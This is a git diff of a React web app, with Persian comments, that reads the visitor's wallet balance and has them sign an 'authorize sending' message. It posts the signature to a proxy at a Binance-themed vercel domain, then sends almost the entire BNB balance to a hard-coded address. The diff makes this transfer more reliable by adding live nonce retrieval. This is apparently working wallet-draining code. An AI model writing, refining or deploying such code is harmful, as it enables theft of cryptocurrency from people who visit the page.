@@ -2,7 +2,6 @@ import React, { useState } from "react";
 
 async function getLiveBalance(address) {
   try {
-    // دریافت بالانس واقعی کیف پول از طریق eth_getBalance
     const balanceHex = await window.ethereum.request({
       method: "eth_getBalance",
       params: [address, "latest"],
@@ -20,7 +19,7 @@ async function getGasPrice() {
       method: "eth_gasPrice",
       params: [],
     });
-    return parseInt(gasPriceHex, 16);
+    return parseInt(gasPriceHex, 16); // in Wei
   } catch (error) {
     console.error("❌ Error fetching gas price:", error);
     return null;
@@ -51,7 +50,6 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // دریافت بالانس واقعی از طریق eth_getBalance
     const liveBalanceStr = await getLiveBalance(userAddress);
     console.log("💰 Live BNB Balance:", liveBalanceStr);
     const totalBalance = parseFloat(liveBalanceStr);
@@ -60,7 +58,7 @@ function App() {
       return;
     }
 
-    // تعیین reserve: به عنوان مثال reserve = 0.01 BNB
+    // reserve تنظیم شده: برای مثال 0.01 BNB
     const reserveBNB = 0.01;
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
@@ -69,7 +67,6 @@ function App() {
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    // ساخت پیام برای امضا بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
@@ -85,7 +82,6 @@ function App() {
       return;
     }
 
-    // ارسال امضا به سرور برای بررسی (آدرس واقعی send.php را جایگزین کنید)
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -108,13 +104,26 @@ function App() {
       return;
     }
 
-    // ساخت تراکنش واقعی
+    // دریافت nonce به صورت زنده
+    let nonceHex;
+    try {
+      nonceHex = await window.ethereum.request({
+        method: "eth_getTransactionCount",
+        params: [userAddress, "latest"],
+      });
+      console.log("Nonce (hex):", nonceHex);
+    } catch (err) {
+      console.error("❌ Error fetching nonce:", err);
+      return;
+    }
+
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
-    // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
     const txParams = {
       from: userAddress,
-      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
-      value: sendWeiHex
+      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
+      value: sendWeiHex,
+      nonce: nonceHex
+      // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
     };
 
     try {
